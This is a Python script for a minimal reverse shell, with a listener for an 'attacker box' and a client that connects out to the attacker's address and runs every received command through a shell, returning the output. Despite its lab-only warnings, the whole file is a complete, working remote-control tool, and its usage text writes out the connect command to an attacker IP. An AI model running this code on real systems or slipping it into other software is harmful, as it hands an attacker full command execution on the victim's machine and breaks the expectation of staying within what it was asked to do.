"""
Minimal reverse shell lab demo (for isolated lab only).
Provides a listener and a client. DO NOT deploy outside your lab.

Usage:
  Listener (attacker box): python lab_shell.py listen --host 0.0.0.0 --port 4444
  Client   (lab target):   python lab_shell.py connect --host <attacker-ip> --port 4444
"""

from __future__ import annotations

import argparse
import socket
import subprocess
import sys
import threading


def listen(host: str, port: int) -> None:
    print("⚠️  Lab-only reverse shell listener. Do not expose to the internet.")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(1)
    conn, addr = srv.accept()
    print(f"[+] Connection from {addr}")
    while True:
        cmd = input("shell> ")
        if cmd.strip() == "":
            continue
        if cmd.lower() in {"exit", "quit"}:
            conn.sendall(b"exit\n")
            break
        conn.sendall(cmd.encode() + b"\n")
        data = conn.recv(4096)
        if not data:
            break
        print(data.decode(errors="ignore"), end="")
    conn.close()
    srv.close()


def handle_recv(sock: socket.socket) -> None:
    while True:
        data = sock.recv(1024)
        if not data:
            sys.exit(0)
        proc = subprocess.Popen(data.decode(errors="ignore"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out, _ = proc.communicate()
        sock.sendall(out or b"")


def connect(host: str, port: int) -> None:
    print("⚠️  Lab-only client. Run only inside an isolated lab you own.")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    threading.Thread(target=handle_recv, args=(sock,), daemon=True).start()
    try:
        while True:
            # keep alive
            pass
    except KeyboardInterrupt:
        sock.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Lab-only reverse shell demo (isolate your lab).")
    sub = parser.add_subparsers(dest="mode", required=True)
    p_listen = sub.add_parser("listen")
    p_listen.add_argument("--host", default="0.0.0.0")
    p_listen.add_argument("--port", type=int, default=4444)
    p_conn = sub.add_parser("connect")
    p_conn.add_argument("--host", required=True, help="Listener host.")
    p_conn.add_argument("--port", type=int, default=4444)
    args = parser.parse_args()

    if args.mode == "listen":
        listen(args.host, args.port)
    else:
        connect(args.host, args.port)


if __name__ == "__main__":
    main()
